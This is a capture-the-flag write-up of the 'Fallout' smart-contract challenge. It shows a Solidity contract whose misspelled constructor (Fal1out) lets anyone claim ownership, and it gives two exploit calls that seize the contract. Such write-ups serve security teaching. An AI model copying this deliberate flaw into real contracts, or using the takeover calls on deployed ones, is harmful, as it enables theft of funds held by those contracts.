# Fallout Challenge: 

## The goal of this challenge is to claim the ownership of the contract

Smart Contract: 

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

After analayzing the contract we can tell that the owner is only changeable in the Fal1out function.

To give some context, In solidity 0.6 constructors naming used to be similar to the name of the contract and that way solidity would treat it as a constructor but if we were to pay some attention here it turns out the the function is spelled F-a-l-1-o-u-t not F-a-l-l-o-u-t which means that this will be treated as just another payable function.

So there's two ways of hacking this smart contract.

1) Simply just call the Fal1out function in the console: 

```
await contract.Fal1out({ value: "100" })
```

Now if you were to check the owner of the contract it would show your wallet address: 
```
await contract.owner()
```

2) The second approach would be to create another file and simply just create an interface of the contract and call the Fal1out function from there

```
// SPDX-License-Identifier: MIT

interface Fallout {

    function Fal1out() external payable;
}
```

After calling this function the ownership would be transferred to you.